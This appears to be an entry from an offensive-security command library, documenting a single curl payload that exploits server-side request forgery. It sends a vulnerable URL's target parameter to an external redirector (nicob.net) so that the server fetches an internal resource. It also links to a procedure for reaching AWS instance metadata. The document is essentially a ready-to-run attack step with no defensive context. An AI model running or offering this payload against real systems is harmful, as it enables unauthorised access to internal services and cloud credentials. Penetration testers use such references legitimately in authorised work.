---
type: command
executor: bash
data: 'curl "$_VULN_URL?target=http://nicob.net/redir6a" -v'
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
tags:
  - ssrf
  - redirect
verified: true
validated: true
---

# curl-static-redirect-payload

## Command

```bash
curl "$_VULN_URL?target=http://nicob.net/redir6a" -v
```

## Description

Static redirect to internal target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Redirected internal response.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
